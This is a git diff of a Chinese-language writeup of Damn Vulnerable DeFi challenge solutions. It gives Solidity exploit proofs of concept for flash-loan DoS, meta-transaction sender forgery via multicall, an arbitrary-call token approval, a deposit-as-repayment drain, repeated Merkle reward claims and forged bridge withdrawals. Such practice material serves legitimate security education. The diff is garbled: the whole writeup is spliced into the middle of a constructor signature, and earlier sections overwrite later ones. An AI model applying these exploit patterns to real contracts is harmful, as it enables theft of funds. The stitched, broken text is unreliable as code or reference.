@@ -1,4 +1,4 @@
-q    ## Damn Vulnerable DeFi Writeup [SunSec]
+## Damn Vulnerable DeFi Writeup [SunSec]
 
 
 ### Unstoppable
@@ -1201,173 +1201,249 @@ contract Exploit {
     DamnValuableToken public token;
     address recovery;
 
-    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
-        marketplace = _marketplace;
-        token = _token;
-        recovery = _recovery;
+    constructor(ShardsNFTMarketplace[## Damn Vulnerable DeFi Writeup [SunSec]
+
+
+### Unstoppable
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/): 
+有一個代幣化的金庫，存入了100萬個DVT代幣。該金庫提供免費的閃電貸款，直到寬限期結束。為了在完全無需許可前捕捉任何錯誤，開發者決定在測試網中進行實時測試。還有一個監控合約，用來檢查閃電貸款功能的運行狀況。從餘額為10個DVT代幣開始，展示如何使金庫停止運行。必須讓它停止提供閃電貸款。
+
+過關條件:
+- 讓 flashLoan 功能失效
+
+知識點:
+-   閃電貸
+-   DOS
+
+
+解題:
+只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。
+
+```
+ if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
+```
+
+[POC:](./damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 
+```
+    function test_unstoppable() public checkSolvedByPlayer {
+        token.transfer(address(vault), 123);   
+    }
+```
+
+
+
+### Naive Receiver
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/): 
+有一個資金池，餘額為1000 WETH，並提供閃電貸款。它收取固定費用為1 WETH。該資金池通過整合無需許可的轉發合約，支持元交易。一名使用者部署了一個餘額為10 WETH的範例合約。看起來它可以執行WETH的閃電貸款。所有資金都面臨風險！將使用者和資金池中的所有WETH救出，並將其存入指定的recovery賬戶。
+
+過關條件:
+- 必須執行兩次或更少的交易。確保 vm.getNonce(player) 小於等於2
+- 確保 weth.balanceOf(address(receiver)) 為 0
+- 確保 weth.balanceOf(address(pool)) 為 0
+- 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。
+
+知識點:
+-   閃電貸
+-   建立攻擊合約滿足一筆交易完成攻擊
+-   MultiCall
+-   msg.data (calldata操作)
+
+解題:
+- NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 
+[ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): 閃電貸模組和允許閃電貸的 {ERC20} 擴充.
+- FlashLoanReceiver 題目初始有10ETH,每次接收的 Flashloan 會支付1ETH手續費給 Pool. 但問題在於 onFlashLoan 沒有檢查發起 Flashloan是不是授權的來源. 所以我們只要發送10次 Flashloan 然後 amount 帶入0. 就可以把FlashLoanReceiver的10ETH轉走. 但是題目要求 Nonce 要小於2. 在前面有提到 NaiveReceiverPool 繼承 Multicall.  所以我們可以透過Multicall執行一次交易操作10次Flashloan就可以滿足 Nonce 小於2.
+- 再來要想辦法把 NaiveReceiverPool 初始的1000ETH轉走. 從合約中可以看到唯一可以把資產轉走的function 是 withdraw. 可以發現到 _msgSender 需滿足 msg.sender == trustedForwarder && msg.data.length >= 20. 就可以返回最後20bytes 地址. 這邊是可以操控的.
+- 再來是滿足 msg.sender == trustedForwarder. 這裡就要透過 forwarder 執行 meta-transaction.  
+
+```
+    function withdraw(uint256 amount, address payable receiver) external {
+        // Reduce deposits
+        deposits[_msgSender()] -= amount;
+        totalDeposits -= amount;
+
+        // Transfer ETH to designated receiver
+        weth.transfer(receiver, amount);
+    }
+    function _msgSender() internal view override returns (address) {
+        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
+            return address(bytes20(msg.data[msg.data.length - 20:]));
+            //bytes20：將 msg.data 中最後 20 個字節轉換為 address 類型
+        } else {
+            return super._msgSender();
+        }
     }
 
-    function attack(uint64 offerId) external {
-        uint256 wantShards = 100; // Fill 100 shards per call
-
-        // Loop 10 times to execute fill(1, 100)
-        for (uint256 i = 0; i < 10001; i++) {
-            marketplace.fill(offerId, wantShards);
-            marketplace.cancel(1,i);
+```
+[POC](./damn-vulnerable-defi/test/naive-receiver/NaiveReceiver.t.sol) : 
+```
+    function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory callDatas = new bytes[](11);
+        for(uint i=0; i<10; i++){
+            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
         }
+        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer)))
+        );
+        bytes memory callData;
+        callData = abi.encodeCall(pool.multicall, callDatas);
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            callData,
+            1 days
+        );
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
 
-        token.transfer(recovery,token.balanceOf(address(this)));
+        forwarder.execute(request, signature);
+    }
+```
+
+### Truster
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/truster/): 
+越來越多的借貸池提供閃電貸款。在這個情況下，一個新的池子已經啟動，提供免費的 DVT 代幣閃電貸款。該池子持有 100 萬個 DVT 代幣。而你什麼都沒有。要通過這個挑戰，你需要在一筆交易中拯救池子中的所有資金，並將這些資金存入指定的恢復賬戶。
+
+過關條件:
+- 只能執行1筆交易
+- 救援資金發送至 recovery 帳戶
+
+知識點:
+-   Arbitrary call
+
+
+解題:
+- 在 floashLoan 中可以看到 target.functionCall(data); 可以執行任意calldata且target的地址可控. 可直接執行任意指令.
+
+[POC](./damn-vulnerable-defi/test/truster/Truster.t.sol) : 
+```
+    function test_truster() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(address(pool), address(token),address(recovery));
+    }
+    
+ contract Exploit {
+    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
+
+    constructor(address _pool, address _token, address recoveryAddress) payable {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
+        pool.flashLoan(0, address(this), _token, data);
+        DamnValuableToken token = DamnValuableToken(_token);
+        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
     }
 }
 ```
 
-### Curvy Puppet
+### Side Entrance
 
-[題目](https://www.damnvulnerabledefi.xyz/challenges/curvy-puppet/): 這裡有一個借貸合約，任何人都可以從 Curve 的 stETH/ETH 池中借出 LP 代幣。為了這麼做，借款人必須首先存入足夠的 Damn Valuable 代幣 (DVT) 作為抵押。如果借款頭寸的價值超過了抵押品的價值，任何人都可以透過償還債務並奪取所有抵押品來清算它。該借貸合約整合了 Permit2 來安全管理代幣授權。它還使用了一個受限的價格預言機來獲取 ETH 和 DVT 的當前價格。Alice、Bob 和 Charlie 都在借貸合約中開立了頭寸。為了格外安全，他們決定將頭寸大幅過度抵押。但他們真的安全嗎？這不是開發者收到的緊急漏洞報告中所聲稱的。在使用者資金被奪走之前，關閉所有頭寸並取回所有可用的抵押品。
-
-開發者已經提供了部分庫存資金以備你在操作中需要使用：200 WETH 和略超過 6 個 LP 代幣。不用擔心利潤，但不要耗盡他們的資金。另外，請確保將任何救回的資產轉移到庫存賬戶。
-注意：此挑戰需要一個有效的 RPC URL，以將主網狀態分叉到你的本地環境。
+[題目](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/): 一個出乎意料的簡單池子允許任何人存入ETH，並隨時提取。該池子已經有1000 ETH的餘額，並提供免費的閃電貸款來推廣他們的系統。你開始時有1 ETH的餘額。通過將池子裡的所有ETH救出並存入指定的 Recovery 錢包來完成挑戰。
 
 過關條件:
-- 所有用戶的部位都被清算
-- Treasury 仍有剩餘資金
-- Player 餘額為0
+- 池子的餘額必須為0.
+- 指定的 Recovery 錢包中的餘額必須等於池子中原本的ETH數量（即 ETHER_IN_POOL）.
 
 知識點:
--   read only reentrancy
+- 錯誤使用 address(this).balance 當驗證方法
 
 解題:
--
-    
-### Withdrawal
+- flashLoan 採用非標準用法, 判斷有沒有repay只是看池子的餘額 if (address(this).balance < balanceBefore). 
+- 所以只要透過 flashLoan借款出來, 再透過deposit存回去. 就代表repay了. 然後你在合約同時有存款證明, 可執行 withdraw 就可以把$$轉出去了.
 
-[題目](https://www.damnvulnerabledefi.xyz/challenges/withdrawal/): 
-有一個代幣橋用來將 Damn Valuable Tokens (DVT) 從 L2 提領到 L1，該橋上有一百萬 DVT 代幣的餘額。L1 端的代幣橋允許任何人在延遲期過後，並且提供有效的默克爾證明時，完成提領。該證明必須與代幣橋所有者設定的最新提領根對應。你收到了一個包含 4 筆在 L2 發起的提領的事件日誌的 JSON 檔案。這些提領可以在 7 天延遲期過後執行。但其中有一筆可疑的提領，不是嗎？你可能需要仔細檢查，因為所有資金可能都處於風險之中。幸運的是，你是一名具有特殊權限的橋樑操作員。透過完成所有給定的提領，防止可疑的那一筆執行，並且確保不會耗盡所有資金來保護這座橋樑。
-
-過關條件:
-- L1 Token Bridge 保留大部分的代幣至少是 99%
-- Player 地址的代幣餘額必須為 0
-- L1 Gateway 的 counter() 值必須大於或等於 WITHDRAWALS_AMOUNT，表示足夠多的提領已完成。
-- 以下四個提領的 ID 必須都已被標記為完成：
-hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"（第一筆提領）
-hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"（第二筆提領）
-hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"（第三筆提領）
-hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"（第四筆提領）
-
-知識點:
--  跨鏈交易 L2 -> L1
-    -  L2Handler.sendMessage：在 L2 上，L2Handler 發送跨鏈訊息
-    -  L1Forwarder.forwardMessage：在 L1 上，L1Forwarder 轉發訊息
-    -  L1Gateway.finalizeWithdrawal：L1Gateway 確認提領，完成跨鏈操作
-    -  TokenBridge.executeTokenWithdrawal：TokenBridge 執行代幣轉移，將代幣發送給接收者。
--  Calldata decode
-
-解題:
-- 題目給了 withdrawals.json, 裡面是 MessageStored L2 打到L1的4筆log.
-MessageStored的 event signature 是 0x43738d03
-透過 keccak256("MessageStored(bytes32,uint256,address,address,uint256,bytes)") 前4bytes得到的.
-- 再來要decode一下data. 看看裡面有什麼操作
-
+[POC](./damn-vulnerable-defi/test/SideEntrance/SideEntrance.t.sol) : 
 ```
-eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
-0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
-0000000000000000000000000000000000000000000000000000000000000060 // data.offset
-0000000000000000000000000000000000000000000000000000000000000104 // data.length
-01210a38                                                         // L1Forwarder.forwardMessage.selector
-0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
-000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
-0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
-0000000000000000000000000000000000000000000000000000000000000080 // message.offset
-0000000000000000000000000000000000000000000000000000000000000044 // message.length
-81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
-000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
-0000000000000000000000000000000000000000000000008ac7230489e80000 // amount (10e18)
-0000000000000000000000000000000000000000000000000000000000000000
-000000000000000000000000000000000000000000000000
-```
-- L1Gateway.finalizeWithdrawal 如果是 Operator 不檢查 MerkleProof. 而且 player 有 Operator role. 這邊就可以偽造請求. 來把 token bridge的代幣提走, 我們可以先搶救  900000. 
-- 過關條件還要把withdrawals.json裡面的4筆交易狀態需要是finalized, 所以要把這4筆透過 L1Gateway.finalizeWithdrawal 發送一次. 因為我們先搶救了 900000 儘管4筆請求的第3筆轉移資產 999000 會造成轉帳失敗, 但是這個沒有在狀態檢查內, 導致整的交易不會被revert.
-![Screenshot 2024-09-06 at 3.35.56 PM](https://hackmd.io/_uploads/H1Oy-NO3A.png)
- 
-- 最後再把救援的token,還給tokenBridge.
-- 
-[POC](./damn-vulnerable-defi/test/withdrawal/Withdrawal.t.sol) :
-
-```
-    function test_withdrawal() public checkSolvedByPlayer {
-
-        // fake withdrawal operation and obtain tokens
-        bytes memory message = abi.encodeCall(
-            L1Forwarder.forwardMessage,
-            (
-                0, // nonce
-                address(0), //  
-                address(l1TokenBridge), // target
-                abi.encodeCall( // message
-                    TokenBridge.executeTokenWithdrawal,
-                    (
-                        player, // deployer receiver
-                        900_000e18 //rescue 900_000e18
-                    )
-                )
-            )
-        );
-
-        l1Gateway.finalizeWithdrawal(
-            0, // nonce
-            l2Handler, // pretend l2Handler 
-            address(l1Forwarder), // target is l1Forwarder
-            block.timestamp - 7 days, // to pass 7 days waiting peroid
-            message, 
-            new bytes32[](0)   
-        );
-
-        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
-        
-        vm.warp(1718786915 + 8 days);
-        // first finalizeWithdrawal
-        l1Gateway.finalizeWithdrawal(
-            0, // nonce 0
-            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
-            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
-            1718786915, // timestamp
-            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
-            new bytes32[](0)    // Merkle proof
-        );
-
-        // second finalizeWithdrawal
-        l1Gateway.finalizeWithdrawal(
-            1, // nonce 1
-            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
-            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
-            1718786965, // timestamp
-            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
-            new bytes32[](0)    // Merkle proof
-        );
-
-        // third finalizeWithdrawal
-        l1Gateway.finalizeWithdrawal(
-            2, // nonce 2
-            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
-            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
-            1718787050, // timestamp
-            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
-            new bytes32[](0)    // Merkle proof
-        );
-
-        // fourth finalizeWithdrawal
-        l1Gateway.finalizeWithdrawal(
-            3, // nonce 3
-            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
-            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
-            1718787127, // timestamp
-            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
-            new bytes32[](0)    // Merkle proof
-        );
- 
-        token.transfer(address(l1TokenBridge),900_000e18);
-        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
-        
+    function test_sideEntrance() public checkSolvedByPlayer {
+        Exploit exploiter = new Exploit(address(pool), recovery, ETHER_IN_POOL);
+        exploiter.attack();
     }
-    
+contract Exploit{
+    SideEntranceLenderPool public pool;
+    address public recovery;
+    uint public exploitAmount;
+    constructor(address _pool, address _recovery, uint _amount){  
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+        exploitAmount = _amount;
+    }
+    function attack() external returns(bool){
+        pool.flashLoan(exploitAmount);
+        pool.withdraw();
+        payable(recovery).transfer(exploitAmount);
+    }
+    function execute() external payable{
+        pool.deposit{value:msg.value}();
+    }
+    receive() external payable{}
+}
+
 ```
+### The Rewarder
+[題目](https://www.damnvulnerabledefi.xyz/challenges/the-rewarder/): 一個合約正在分發Damn Valuable Tokens和WETH作為獎勵。要領取獎勵，用戶必須證明自己在選定的受益者名單中。不過不用擔心燃料費，這個合約已經過優化，允許在同一筆交易中領取多種代幣。Alice已經領取了她的獎勵。你也可以領取你的獎勵！但你發現這個合約中存在一個關鍵漏洞。儘可能多地從這個分發者手中拯救資金，將所有回收的資產轉移到指定的 Recovery 錢包中。
+
+過關條件:
+- 分發者合約中的剩餘DVT數量必須少於1e16（也就是0.01 DVT），僅允許留下極少量的「Dust」。
+- 分發者合約中的剩餘WETH數量必須少於1e15（也就是0.001 WETH），僅允許留下極少量的「Dust」。
+- 指定Recovery 錢包中的DVT數量必須等於總分發DVT數量（TOTAL_DVT_DISTRIBUTION_AMOUNT）減去Alice已經領取的DVT數量（ALICE_DVT_CLAIM_AMOUNT）以及分發者合約中剩餘的DVT數量。
+- 指定Recovery 錢包中的WETH數量必須等於總分發WETH數量（TOTAL_WETH_DISTRIBUTION_AMOUNT）減去Alice已經領取的WETH數量（ALICE_WETH_CLAIM_AMOUNT）以及分發者合約中剩餘的WETH數量。
+
+知識點:
+- 在 Array 更新狀態邏輯錯誤
+
+解題:
+- 基於 Merkle proofs 和 bitmaps 代幣分配合約
+- REF: [Bitmaps & Merkle Proofs](https://x.com/DegenShaker/status/1825835855140868370) | [Bitmap结构在ENSToken里的应用](https://mirror.xyz/franx.eth/0PTXWm1ynYxeF11S_xlXzmQqeICHQeI4tz3Uwz9aWuk)
+- 合約中可以發現在 claimRewards 中, 更新用戶是不是有領過reward是透過 _setClaimed().
+- 因為 claimRewards支援array, 可以一個transaction執行多次claim. 並在最後一個claim才更新用戶claimreward紀錄.
+- player 的地址, index為188
+```
+            // for the last claim
+            if (i == inputClaims.length - 1) {
+                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
+            }
+```
+[POC](./damn-vulnerable-defi/test/the-rewarder/TheRewarder.t.sol) : 
+```
+   function test_theRewarder() public checkSolvedByPlayer {
+        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
+            PLAYER_DVT_CLAIM_AMOUNT;
+        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
+            PLAYER_WETH_CLAIM_AMOUNT;
+        uint totalTxCount = dvtTxCount + wethTxCount;
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Create Alice's claims
+        console.log(totalTxCount);
+        Claim[] memory claims = new Claim[](totalTxCount);
+
+        for (uint i = 0; i < totalTxCount; i++) {
+            if (i < dvtTxCount) {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: PLAYER_DVT_CLAIM_AMOUNT,
+                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(dvtLeaves, 188) //player at index 188
+                });
